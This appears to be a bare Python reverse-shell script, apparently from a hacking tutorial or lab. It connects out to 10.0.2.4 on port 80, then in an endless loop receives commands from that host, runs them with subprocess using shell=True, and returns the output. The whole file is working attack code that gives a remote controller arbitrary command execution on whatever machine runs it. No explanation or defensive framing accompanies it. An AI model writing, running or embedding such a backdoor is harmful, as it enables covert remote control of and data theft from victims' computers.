import socket
import subprocess

def command_exe(command):
    return subprocess.check_output(command, shell=True)

connection = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
connection.connect(("10.0.2.4",80))
connection.send("Connection OK\n")

while(True):
    command = connection.recv(1024)
    command_output = command_exe(command)
    connection.send(command_output)

connection.close()